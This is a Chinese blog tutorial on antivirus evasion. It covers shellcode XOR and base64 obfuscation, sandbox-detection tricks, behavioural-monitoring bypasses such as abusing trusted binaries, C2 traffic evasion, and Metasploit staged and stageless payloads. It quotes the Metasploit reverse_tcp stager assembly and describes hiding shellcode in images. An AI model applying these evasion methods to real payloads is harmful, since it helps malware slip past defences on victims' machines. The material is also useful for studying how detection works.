<img src="/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211014015433901.png" alt="image-20211014015433901" style="zoom:67%;">

<img src="/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211014015458302.png" alt="image-20211014015458302" style="zoom:67%;">

<img src="/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211014015552143.png" alt="image-20211014015552143" style="zoom:67%;">

<p>这里是针对查杀的字符串进行拆分替换。</p>
<p>但是这种定位特征码的办法只能针对本地病毒库，面对云查杀会束手无策，云查杀会产生越来越多的特征码，这种情况可以改为内存加载，在内存里面做免杀，或者利用白加黑…….</p>
<h5 id="对shellcode进行加密编码"><a href="#对shellcode进行加密编码" class="headerlink" title="对shellcode进行加密编码"></a>对shellcode进行加密编码</h5><p>一些编码方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、在特定位置添加垃圾字节</span><br><span class="line">2、使用硬编码的单字节密钥对字节进行XOR或者加减法运算</span><br><span class="line">3、将字节移位某些特定位置</span><br><span class="line">4、交换连续字节</span><br></pre></td></tr></table></figure>

<p>涉及到一些密码学的知识，非对称加密比对称加密效果要好，自己可以定义私钥，个人最喜欢异或，简单有效。</p>
<p>比如这里，先对shellcode进行一层异或加密生成decode_shellcode，然后再encode 执行。当然现在这么简单的异或已经不行了，可以多层异或，多个key，改的他妈都不认识。将shellcode写入内存的方法也是多种多样，下文中有提到，这里只讨论加密混淆。当然也可以使用其他加密方式，思路都一样的嘛</p>
<img src="/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211014020038200.png" alt="image-20211014020038200" style="zoom:67%;">

<img src="/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211014020052793.png" alt="image-20211014020052793" style="zoom:67%;">

<p>下面是GitHub的一个用 base64 混淆的项目，简单说就是将shellcode多层base64编码后，再加载执行，这里加载执行写入内存的方式也是最简单的加载方式。想要效果更好，可以用更强的加密方式，更隐蔽的将shellcode写入内存的方式。</p>
<p>可以看看效果</p>
<p><img src="/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211012131226917.png" alt="image-20211012131226917"></p>
<img src="/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211012131218800.png" alt="image-20211012131218800" style="zoom:67%;">



<p><img src="/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211012131521189.png" alt="image-20211012131521189"></p>
<p>小红伞没有识别出，所以给了警告。</p>
<p>附：现在很多杀软也会针对 sleep 函数进行识别，一般正常的文件执行不会sleep，这时候杀软不得注意一下？</p>
<h3 id="0x02-动态查杀（主动防御）"><a href="#0x02-动态查杀（主动防御）" class="headerlink" title="0x02 动态查杀（主动防御）"></a>0x02 动态查杀（主动防御）</h3><p>动态查杀指的是 程序在运行的过程中执行了某些敏感操作，导致杀软查杀。</p>
<p>谈到动态查杀不得不提一个东西叫沙盒。</p>
<p>沙盒：也叫启发式查杀，通过模拟计算机的环境执行目标文件再观察特征行为</p>
<p>沙盒模拟的常见特征：</p>
<table>
<thead>
<tr>
<th>特征</th>
<th>原因</th>
<th>bypass</th>
</tr>
</thead>
<tbody><tr>
<td>内存较小</td>
<td>不影响计算机正常运行</td>
<td>检测计算机内存是不是很小(判断是否是真实计算机)</td>
</tr>
<tr>
<td>时间较快</td>
<td>沙盒内置的时间速度比现实世界要快，提高查杀速度，沙盒中的时间流逝很快</td>
<td>c语言函数判断1s是否有1000ms/判断是否是utc时间</td>
</tr>
<tr>
<td>进程或文件不完整</td>
<td>减少杀毒软件运行时对计算机的消耗</td>
<td>判断操作系统进程的个数/调用不可能存在的文件</td>
</tr>
<tr>
<td>io设备缺失</td>
<td>鼠标键盘等事件大部分沙盒都没有</td>
<td>检测驱动 usb等/判断鼠标的移动速度等</td>
</tr>
</tbody></table>
<p>其实主要就是找一台真实的计算机和沙盒的区别到底在哪，找到那些真实的计算机具有而模拟的计算机无法具有的特征，进行绕过即可，思路很简单，也很广，自己拓展会发现更多有意思的点。</p>
<p>下面说一下杀软监控动态查杀的点：</p>
<h4 id="计算机相关"><a href="#计算机相关" class="headerlink" title="计算机相关"></a>计算机相关</h4><ol>
<li><p>系统服务（指的是这些）</p>
<img src="/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211014111540437.png" alt="image-20211014111540437" style="zoom:50%;"></li>
<li><p>注册表（键值） 修改注册表的行为一般都是敏感行为（高危添加用户、删除用户，没有十足把握bypass，还是算了）</p>
</li>
<li><p>组策略</p>
</li>
<li><p>防火墙</p>
</li>
<li><p>敏感程序（cmd powershell wmi psexec bitsadmin rundll 等）</p>
</li>
<li><p>各种 win32api</p>
<p>这里强调一下，监控进程调用的api不止是api名字，还包括api的 调用顺序、调用源、参数等等 。 相应的bypass，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用实现同样功能的api替换</span><br><span class="line">重写对应的api</span><br><span class="line">调用0环的api绕过3环杀软</span><br></pre></td></tr></table></figure>

<p>等等，肯定不止这些， 说起来很容易，但具体实现需要很深的底层功底，起码对Windows操作系统的底层实现，win32api等很熟悉，这就需要内功。</p>
</li>
<li><p>文件夹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:/windows/system32   </span><br><span class="line">C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br><span class="line">C:\tmp等敏感文件夹（cs、msf都会在tmp文件夹下生成一些东西）</span><br></pre></td></tr></table></figure></li>
</ol>
<p><strong>绕过</strong>：<code>白加黑</code>  算是一个很好的方法，指的是利用Windows系统的一些白文件去执行相应的敏感操作，就不会触发杀软警告，想一想，有哪个普通的程序去执行添加用户的操作呢？</p>
<p>说到底，白加黑解决的是 Windows里面 <code>信任与权限</code>的问题，Windows 都相信你，它一个杀软有什么办法，权限指的是你的权限是否比杀软的权限高，如果你在0环，杀软在3环，它也没有权限来管你，更不用说kill。</p>
<h4 id="网络相关"><a href="#网络相关" class="headerlink" title="网络相关"></a>网络相关</h4><p>1.<strong>流量特征</strong>: cobalt strike 的通信协议，是由 RSA 传输 AES 的密钥，AES的密钥加密后续通信，这也是c2的常规通信手法，但未经修改的profile 和证书，很容易被检测到。</p>
<p>2.<strong>内容特征</strong>：data字段是否存在命令相关的关键词加密特征（payload是否通讯加密，明文传输就会被查杀）  </p>
<p>3.<strong>结构特征</strong>: 是否存在已知远控的通讯结构（ cs 中 beacon 有 sleep）</p>
<p>4.<strong>IP</strong> : 是否被情报系统标记为恶意</p>
<p><strong>绕过</strong>:</p>
<ul>
<li><p>tcp分段：指的是数据包在传输过程中切分后以小段传输(效果也不错，但是网络连接不好很容易断掉)</p>
</li>
<li><p>内容加密：针对传输的内容，比如那些执行命令的字符串等等，加密混淆，加密还是不要用简单的编码，你简单的base64编码一下，杀软、edr等还是可以检测到，最好用非对称加密</p>
</li>
<li><p>使用合法证书 ： 这个自己找渠道获得吧……</p>
</li>
</ul>
<h3 id="payload基本结构"><a href="#payload基本结构" class="headerlink" title="payload基本结构"></a>payload基本结构</h3><p><strong>分段传输</strong>:</p>
<p>eg: </p>
<p>msfvenom 的<code>meterpreter/reverse_https</code>模块</p>
<p>stager：</p>
<p>stage0：初始shellcode（通常称为<em>stage0</em>）会创建一个新的连接到攻击者的机器并将更大的有效载荷（stage1）读入内存。收到有效载荷后，stage0 会将控制权交给新的更大的有效载荷。stage0 只负责建立通信连接，不能够执行命令(getuid、getsystem等)</p>
<p>stage1（metsrv）：stage0执行完后发送stage1到目标机器并写入内存，弹回meterpreter会话，我们在meterpreter里执行的命令，还有加载的模块（load kiwi等）都是stage1的功劳</p>
<p>这里 Sending stage （175174 bytes） 可以看到体积比较大，就是stage1</p>
<p><img src="/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211012232906258.png" alt="image-20211012232906258"></p>
<p>很多分段加载骚思路也是基于stager来实现，初始投递的文件非常小，载入内存后，在内存中解密加载  加载器，然后加载器再解密加载shellcode。具体实现方法也多种多样，各种语言，c#，go等。</p>
<p>更多骚思路自行扩展……</p>
<p><strong>整段传输</strong>：</p>
<p>一次性发送很大的stage</p>
<p><code>meterpreter_reverse_https</code></p>
<p>stageless：</p>
<p>建立通信连接+执行命令</p>
<p><img src="/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211012232942431.png" alt="image-20211012232942431"></p>
<p>可以看到两种stage的体积差别</p>
<img src="/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211014115158319.png" alt="image-20211014115158319" style="zoom:67%;">

<p>显然这种效果不如stager的效果好。</p>
<p>再简单看一下stager的汇编，不需要全部看懂，只有这么多代码，找到关键的功能</p>
<p><code>try_connect</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">;-----------------------------------------------------------------------------;</span><br><span class="line">; Author: Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)</span><br><span class="line">; Compatible: Windows 7, 2008, Vista, 2003, XP, 2000, NT4</span><br><span class="line">; Version: 1.0 (24 July 2009)</span><br><span class="line">;-----------------------------------------------------------------------------;</span><br><span class="line">[BITS 32]</span><br><span class="line"></span><br><span class="line">; Input: EBP must be the address of &#x27;api_call&#x27;.</span><br><span class="line">; Output: EDI will be the socket for the connection to the server</span><br><span class="line">; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)</span><br><span class="line"></span><br><span class="line">reverse_tcp:</span><br><span class="line">  push 0x00003233        ; Push the bytes &#x27;ws2_32&#x27;,0,0 onto the stack.</span><br><span class="line">  push 0x5F327377        ; ...</span><br><span class="line">  push esp               ; Push a pointer to the &quot;ws2_32&quot; string on the stack.</span><br><span class="line">  push 0x0726774C        ; hash( &quot;kernel32.dll&quot;, &quot;LoadLibraryA&quot; )</span><br><span class="line">  call ebp               ; LoadLibraryA( &quot;ws2_32&quot; )</span><br><span class="line">  </span><br><span class="line">  mov eax, 0x0190        ; EAX = sizeof( struct WSAData )</span><br><span class="line">  sub esp, eax           ; alloc some space for the WSAData structure</span><br><span class="line">  push esp               ; push a pointer to this stuct</span><br><span class="line">  push eax               ; push the wVersionRequested parameter</span><br><span class="line">  push 0x006B8029        ; hash( &quot;ws2_32.dll&quot;, &quot;WSAStartup&quot; )</span><br><span class="line">  call ebp               ; WSAStartup( 0x0190, &amp;WSAData );</span><br><span class="line">  </span><br><span class="line">  push eax               ; if we succeed, eax wil be zero, push zero for the flags param.</span><br><span class="line">  push eax               ; push null for reserved parameter</span><br><span class="line">  push eax               ; we do not specify a WSAPROTOCOL_INFO structure</span><br><span class="line">  push eax               ; we do not specify a protocol</span><br><span class="line">  inc eax                ;</span><br><span class="line">  push eax               ; push SOCK_STREAM</span><br><span class="line">  inc eax                ;</span><br><span class="line">  push eax               ; push AF_INET</span><br><span class="line">  push 0xE0DF0FEA        ; hash( &quot;ws2_32.dll&quot;, &quot;WSASocketA&quot; )</span><br><span class="line">  call ebp               ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );</span><br><span class="line">  xchg edi, eax          ; save the socket for later, don&#x27;t care about the value of eax after this</span><br><span class="line"></span><br><span class="line">set_address:</span><br><span class="line">  push byte 0x05         ; retry counter</span><br><span class="line">  push 0x0100007F        ; host 127.0.0.1</span><br><span class="line">  push 0x5C110002        ; family AF_INET and port 4444</span><br><span class="line">  mov esi, esp           ; save pointer to sockaddr struct</span><br><span class="line">  </span><br><span class="line">try_connect:</span><br><span class="line">  push byte 16           ; length of the sockaddr struct</span><br><span class="line">  push esi               ; pointer to the sockaddr struct</span><br><span class="line">  push edi               ; the socket</span><br><span class="line">  push 0x6174A599        ; hash( &quot;ws2_32.dll&quot;, &quot;connect&quot; )</span><br><span class="line">  call ebp               ; connect( s, &amp;sockaddr, 16 );</span><br><span class="line"></span><br><span class="line">  test eax,eax           ; non-zero means a failure</span><br><span class="line">  jz short connected</span><br><span class="line"></span><br><span class="line">handle_failure:</span><br><span class="line">  dec dword [esi+8]</span><br><span class="line">  jnz short try_connect</span><br><span class="line"></span><br><span class="line">failure:</span><br><span class="line">  push 0x56A2B5F0        ; hardcoded to exitprocess for size</span><br><span class="line">  call ebp</span><br><span class="line"></span><br><span class="line">connected:</span><br></pre></td></tr></table></figure>

<p>因此可以看出stager仅仅是连接功能，而不能够进行其他操作。可以自己去GitHub找msf的模块来对比，文末也会放上链接。</p>
<p>​    还要提一点：msf加载的各种命令 比如powershell  kiwi这种，是各种反射注入的dll，反射注入到执行的进程上</p>
<p><img src="/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211012234041565.png" alt="image-20211012234041565"></p>
<p>其中的msf中的<code>进程迁移</code>：是在无文件落地的情况下，将内存中的shellcode注入到其他进程。</p>
<p>关于无文件落地，比较复杂，我太菜了，等研究到再单独写一篇…</p>
<p>下面说一点免杀的方法和思路：</p>
<h3 id="分离免杀"><a href="#分离免杀" class="headerlink" title="分离免杀"></a>分离免杀</h3><p>因为shellcode在程序里面很容易被查杀，像下面是最常用的加载shellcode的方式，内联汇编执行，函数指针执行，强制转换等等，当然很明显，这几种现在都是不免杀的。</p>
<p>要提一下内联汇编中的 <code>_emit 0xff _emit 0xE0 </code>是硬编码执行，与 <code>jmp eax /call eax </code>的作用是一样的，网上有很多文章说是花指令，用来干扰杀软的，但在我实际测试中，删掉是无法加载shellcode的。</p>
<img src="/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211014103917056.png" alt="image-20211014103917056" style="zoom:67%;">

<img src="/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211014103942943.png" alt="image-20211014103942943" style="zoom:67%;">





<p>这里的分离免杀是用 msfvenom 生成一段raw格式的shellcode 放在 png 图片里，然后加载器 将shellcode写入内存中</p>
<img src="/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211013000137040.png" alt="image-20211013000137040" style="zoom:67%;">

<img src="/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211013000204080.png" alt="image-20211013000204080" style="zoom:67%;">

<p>经测试，可以简单的过掉火绒，360没有测试，会被小红伞杀。因为这里将shellcode写入内存的方式还是前面说的最简单的方式，换橙其他加载方式，应该也是可以过掉的。</p>
<p>分离免杀包括但不限于</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shellcode从文本提取 </span><br><span class="line">shellcode与加载器分离</span><br><span class="line">远程加载shellcode（shellcode放在另一台主机上，走http协议下载）</span><br><span class="line">管道运输</span><br><span class="line">隐写在图片上，powershell加载</span><br></pre></td></tr></table></figure>

<p>具体的其他分离免杀可以去网上找对应的实现，这里仅仅介绍并提供思路。</p>
<p>当然传统的这些函数早已被杀软加入豪华套餐</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">WinHttpOpen</span><br><span class="line">WinHttpConnect</span><br><span class="line">WinHttpOpenRequest</span><br><span class="line">WinHttpSendRequest</span><br><span class="line">WinHttpReceiveResponse</span><br><span class="line">WinHttpQueryDataAvailable</span><br><span class="line">WinHttpReadData</span><br><span class="line">WinHttpCloseHandle</span><br></pre></td></tr></table></figure>

<p>但幸运的是，Windows 提供了许多不同的库，可用于下载数据，例如<code>winInet、WinHTTP 和 Windows Sockets</code>。通过切换到更加手动的基于套接字的实现 ，如果使用这些第三方库或使用系统自带的下载命令，被杀软查杀的概率会小很多。</p>
<p><strong>其他免杀思路</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">远程线程注入</span><br><span class="line">远程加载</span><br><span class="line">管道传输</span><br><span class="line">白加黑</span><br><span class="line">父进程调用子进程</span><br></pre></td></tr></table></figure>

<p>等等，还有其他骚思路……自己去想</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>做免杀，首先要原理烂熟于心，得知道为什么会被杀，杀的哪里，才有目的的去做，而不是啥都不懂，就去盲杀（在不清楚杀软规则好像也只能这样… 但是效率很低嘛）</p>
<p>前面也介绍了各种免杀的思路，可以自己去扩充，上面主要是基于c/cpp来实现，也可以用其他语言 powershell /c#/go/nim/python等来实现。方法还是很多的，但前提是要有一定的底层知识储备。</p>
<p>下面两张图刚开始看会觉得很空，但仔细研究会发现做免杀就是根据这个步骤来的，整个流程很清晰，只不过在实现的过程中需要大量的底层知识来支撑罢了。</p>
<p>希望可以给大家带来一点帮助，祝大家早日拳打火眼，脚踢卡巴斯基，bypass全球杀软~</p>
<p><img src="/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211013003245103.png" alt="image-20211013003245103"></p>
<p><img src="/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211013003337672.png" alt="image-20211013003337672"></p>
<p>参考链接：</p>
<p><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/132175.html">恶意程序编写之免杀基础 - SecPulse.COM | 安全脉搏</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/25894246">免杀的艺术：PE文件后门的植入（二） - 知乎 (zhihu.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://cutecuteyu.github.io/2021/03/03/%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/">https://cutecuteyu.github.io/2021/03/03/%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_reverse_tcp.asm">https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_reverse_tcp.asm</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9499">https://xz.aliyun.com/t/9499</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.f-secure.com/dynamic-shellcode-execution/">https://blog.f-secure.com/dynamic-shellcode-execution/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/">https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/</a></p>
<p>Peace.</p>

  </div>
</article>

    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
    <div id="vcomments" class="blog-post-comments"></div>
    <script>
        new Valine({
            el: '#vcomments',
            visitor: true,
            appId: '7u7uebjtVAc7zqC8W6KLczVp-gzGzoHsz',
            appKey: 'MWpJPixdx6qnP8OBPnTR7Yd9',
            placeholder: '',
            avatar: 'mp'
        })
    </script>






        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/links">Links</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-%E9%9D%99%E6%80%81%E6%9F%A5%E6%9D%80"><span class="toc-number">2.</span> <span class="toc-text">0x01 静态查杀:</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E7%89%B9%E5%BE%81%E7%A0%81%E8%AF%86%E5%88%AB"><span class="toc-number">2.0.1.</span> <span class="toc-text">1.特征码识别:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E4%BA%91%E6%9F%A5%E6%9D%80"><span class="toc-number">2.0.2.</span> <span class="toc-text">2.云查杀:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E6%A0%A1%E9%AA%8C%E5%92%8C%E6%B3%95"><span class="toc-number">2.0.3.</span> <span class="toc-text">3.校验和法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E5%90%AF%E5%8F%91%E5%BC%8F%E6%89%AB%E6%8F%8F%EF%BC%9A"><span class="toc-number">2.0.4.</span> <span class="toc-text">4.启发式扫描：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#yara%E8%A7%84%E5%88%99%EF%BC%9A"><span class="toc-number">2.0.5.</span> <span class="toc-text">yara规则：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80%E6%96%B9%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text">静态免杀方法:</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#MYCCL%E6%9F%A5%E6%89%BE%E7%89%B9%E5%BE%81%E7%A0%81%E4%BF%AE%E6%94%B9%EF%BC%9A"><span class="toc-number">3.0.1.</span> <span class="toc-text">MYCCL查找特征码修改：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AF%B9shellcode%E8%BF%9B%E8%A1%8C%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81"><span class="toc-number">3.0.2.</span> <span class="toc-text">对shellcode进行加密编码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-%E5%8A%A8%E6%80%81%E6%9F%A5%E6%9D%80%EF%BC%88%E4%B8%BB%E5%8A%A8%E9%98%B2%E5%BE%A1%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">0x02 动态查杀（主动防御）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%9B%B8%E5%85%B3"><span class="toc-number">4.1.</span> <span class="toc-text">计算机相关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3"><span class="toc-number">4.2.</span> <span class="toc-text">网络相关</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload%E5%9F%BA%E6%9C%AC%E7%BB%93%E6%9E%84"><span class="toc-number">5.</span> <span class="toc-text">payload基本结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80"><span class="toc-number">6.</span> <span class="toc-text">分离免杀</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">7.</span> <span class="toc-text">总结</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://0range-x.github.io/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://0range-x.github.io/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/&text=免杀基础入门篇"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://0range-x.github.io/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/&title=免杀基础入门篇"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://0range-x.github.io/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/&is_video=false&description=免杀基础入门篇"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=免杀基础入门篇&body=Check out this article: https://0range-x.github.io/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://0range-x.github.io/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/&title=免杀基础入门篇"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://0range-x.github.io/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/&title=免杀基础入门篇"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://0range-x.github.io/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/&title=免杀基础入门篇"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://0range-x.github.io/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/&title=免杀基础入门篇"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://0range-x.github.io/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/&name=免杀基础入门篇&description=&lt;p&gt;本文首发于先知社区，原文链接：&lt;a href=&#34;https://xz.aliyun.com/t/10369&#34;&gt;https://xz.aliyun.com/t/10369&lt;/a&gt;&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
